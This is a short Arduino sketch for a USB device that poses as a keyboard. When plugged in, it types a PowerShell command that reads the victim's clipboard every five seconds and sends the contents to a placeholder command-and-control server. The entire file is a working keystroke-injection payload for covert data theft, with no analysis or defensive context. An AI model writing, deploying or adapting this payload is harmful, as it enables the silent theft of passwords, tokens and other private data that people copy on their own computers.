#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  Keyboard.println(F("powershell -c \"Add-Type -AssemblyName System.Windows.Forms; while(1){$clip = [Windows.Forms.Clipboard]::GetText(); if($clip){Invoke-WebRequest -Uri http://C2_SERVER/log?data=$clip}; sleep 5}\""));
}
